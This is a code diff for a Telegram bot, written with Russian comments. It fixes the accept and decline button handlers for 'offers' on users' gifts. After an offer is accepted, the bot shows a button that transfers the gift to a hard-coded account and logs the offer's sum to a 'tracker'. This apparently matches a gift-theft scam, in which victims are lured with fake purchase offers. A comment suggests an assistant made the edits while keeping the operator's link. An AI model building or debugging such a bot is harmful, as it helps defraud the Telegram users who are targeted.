@@ -71,7 +71,7 @@ LARGE_PREVIEW = LinkPreviewOptions(
 )
 
 # =====================================
-# КОМАНДА /start (НОВОЕ)
+# КОМАНДА /start
 # =====================================
 @dp.message(CommandStart())
 async def cmd_start(message: Message):
@@ -106,7 +106,7 @@ def offer_kb(oid: str, lang: str) -> InlineKeyboardMarkup:
 
 def instruction_kb(lang: str) -> InlineKeyboardMarkup:
     t = TEXTS.get(lang, TEXTS["ru"])
-    # ТВОЯ ССЫЛКА
+    # ТВОЯ ССЫЛКА (Я ЕЁ НЕ ТРОГАЛ)
     gift_url = "tg://send_gift?to=8863549439"
     
     return InlineKeyboardMarkup(
@@ -227,15 +227,18 @@ async def handle_custom_command(message: Message):
         logging.exception("Ошибка в .оффер")
 
 # =====================================
-# КНОПКИ ПРИНЯТИЯ/ОТКЛОНЕНИЯ
+# КНОПКИ ПРИНЯТИЯ/ОТКЛОНЕНИЯ (ИСПРАВЛЕНО)
 # =====================================
 @dp.callback_query(F.data.startswith("acc:"))
 async def cb_accept(call: CallbackQuery):
+    # 1. СРАЗУ отвечаем Telegram (убираем "часики" с кнопки)
+    await call.answer()
+    
     oid = call.data.split(":", 1)[1]
     offer = OFFERS.get(oid)
     if not offer:
-        return await call.answer("Оффер не найден", show_alert=True)
-    
+        return
+        
     lang = offer.get("lang", "ru")
     t = TEXTS.get(lang, TEXTS["ru"])
 
@@ -245,27 +248,29 @@ async def cb_accept(call: CallbackQuery):
         cur=offer["cur"]
     ) + f"\n\n{offer['url']}"
 
+    # 2. Меняем сообщение (показываем кнопку "Передать подарок")
     try:
         await call.message.edit_text(
             text=text,
             reply_markup=instruction_kb(lang),
             link_preview_options=LARGE_PREVIEW
         )
-    except TelegramBadRequest:
-        pass
+    except Exception as e:
+        logging.error(f"Edit error: {e}")
 
-    await call.answer()
-    await tracker_log(
+    # 3. Отправляем лог в трекер ОТДЕЛЬНО, чтобы ошибка не сломала кнопку
+    asyncio.create_task(tracker_log(
         f"✅ Оффер принят\nID: {oid}\nПодарок: {offer['gift_name']}\n"
         f"Сумма: {offer['sum']} {offer['cur']}"
-    )
+    ))
 
 @dp.callback_query(F.data.startswith("dec:"))
 async def cb_decline(call: CallbackQuery):
+    await call.answer()
     oid = call.data.split(":", 1)[1]
     offer = OFFERS.pop(oid, None)
     if not offer:
-        return await call.answer("Оффер не найден", show_alert=True)
+        return
 
     lang = offer.get("lang", "ru")
     t = TEXTS.get(lang, TEXTS["ru"])
@@ -275,7 +280,6 @@ async def cb_decline(call: CallbackQuery):
     except TelegramBadRequest:
         pass
 
-    await call.answer()
     await tracker_log(f"❌ Оффер отклонён\nID: {oid}")
 
 @dp.callback_query(F.data.startswith("alert_2:"))
